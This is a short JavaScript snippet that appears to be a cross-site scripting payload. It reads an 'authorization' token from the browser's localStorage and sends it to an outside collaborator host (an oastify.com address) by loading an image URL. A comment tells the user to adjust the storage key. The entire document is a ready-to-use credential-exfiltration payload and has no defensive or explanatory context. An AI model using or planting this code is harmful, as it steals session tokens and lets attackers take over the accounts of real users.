(function() {
    try {
        var token = localStorage.getItem('authorization'); // change key if different
        if (token) {
            var url = "https://aiw29wdvarhsglopp3fiknn8cziq6vuk.oastify.com/collect.png?token=" + encodeURIComponent(token);
            var img = new Image();
            img.src = url;
        }
    } catch (e) {
    }
})();
